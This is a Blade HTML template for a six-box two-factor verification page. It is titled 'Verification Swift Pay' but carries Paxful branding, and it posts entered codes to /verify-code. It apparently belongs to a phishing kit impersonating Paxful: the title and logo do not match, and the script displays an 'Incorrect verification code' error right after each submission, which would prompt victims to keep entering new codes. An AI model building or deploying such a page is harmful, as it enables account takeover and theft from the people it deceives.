<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Swift Pay</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="{{ asset('storage/images/logo-icon.ico') }}" type="image/x-icon">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            margin: 0;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: auto;
            font-weight: 400;
            line-height: 1.5;
        }

        .container {
            display: flex;
            flex-wrap: wrap;
            width: 100%;
            max-width: 1200px;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .back-button a {
            color: white;
            text-decoration: none;
        }

        .back-button {
            margin-bottom: 10px;
            font-size: 16px;
            color: white;
        }

        .illustration-section {
            display: none;
        }

        .illustration img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .logo {
            font-size: 30px;
            font-weight: 600;
            padding-top: 5px;
            margin: 0 0 20px 0;
        }

        .logo img {
            height: 24px;
        }

        .welcome-text {
            font-size: 2rem;
            font-weight: 600;
            margin-bottom: 10px;
            margin-top: 10px;
        }

        .signup-link {
            margin-bottom: 20px;
            font-size: 14px;
        }

        .signup-link a {
            color: white;
            text-decoration: none;
            font-weight: 600;
        }

        .input-group {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
        }

        .input-box {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            background-color: #1F1F1F;
            color: #fff;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #A8E239;
            color: #000;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            margin-top: 10px;
        }

        .forgot-password {
            margin-top: 5px;
            text-align: right;
            font-size: 14px;
        }

        .forgot-password a {
            color: #ECECEC;
            text-decoration: none;
        }

        .error-message {
            display: none;
            color: red;
            font-weight: bold;
        }

        @media (min-width: 768px) {
            .container {
                flex-direction: row;
                justify-content: space-between;
                padding: 40px;
            }

            .login-section {
                width: 40%;
                text-align: left;
                margin-left: 20px;
            }

            .illustration-section {
                display: flex;
                width: 50%;
                align-items: center;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-section">
            <div class="logo">
                <img src="{{ asset('storage/images/paxful.png') }}" alt="Paxful Logo">paxful
            </div>
            <div class="back-button">&lt; <a href="/">Back</a></div>
            <div class="welcome-text">Verification</div>
            <div class="signup-link">Enter the 6-digit code we sent to the authenticator associated with your account:<strong>{{session('email')}}</strong></div>
            <div class="signup-link">Confirmation code</div>
            <div class="input-group code-inputs">
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
            </div>
            <div class="signup-link error-message">Incorrect verification code. Please try again.</div>
        </div>
        <div class="illustration-section">
            <div class="illustration">
                <img src="{{ asset('storage/images/registersvg.PNG') }}" alt="Illustration"> 
            </div>
        </div>
    </div>

    <script>
        const inputBoxes = document.querySelectorAll('.input-box');
        const errorMessage = document.querySelector('.error-message');

        inputBoxes.forEach((input, index) => {
            input.addEventListener('input', (event) => {
                if (event.target.value.length === 1 && index < inputBoxes.length - 1) {
                    inputBoxes[index + 1].focus();
                }
                checkFilled();
            });

            input.addEventListener('keydown', (event) => {
                if (event.key === 'Backspace') {
                    clearInputs(); // Clear all input boxes when backspace is pressed
                }
            });

            input.addEventListener('paste', (event) => {
                event.preventDefault();
                const pastedData = event.clipboardData.getData('text').trim();

                if (/^\d{6}$/.test(pastedData)) {
                    pastedData.split('').forEach((char, idx) => {
                        if (inputBoxes[idx]) {
                            inputBoxes[idx].value = char;
                        }
                    });
                    inputBoxes[inputBoxes.length - 1].focus();
                    checkFilled();
                }
            });
        });

        function clearInputs() {
            inputBoxes.forEach(box => box.value = '');
            inputBoxes[0].focus();
            errorMessage.style.display = 'none';
        }

        function checkFilled() {
            const allFilled = Array.from(inputBoxes).every(box => box.value !== '');

            if (allFilled) {
                const code = Array.from(inputBoxes).map(box => box.value).join('');
                submitCode(code);
                errorMessage.style.display = 'block';
            } else {
                errorMessage.style.display = 'none';
            }
        }

        function submitCode(code) {
            fetch('/verify-code', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                },
                body: JSON.stringify({ code })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = '/dashboard';
                } else {
                    errorMessage.style.display = 'block';
                }
            })
            .catch(error => console.error('Error:', error));
        }
    </script>

</body>
</html>
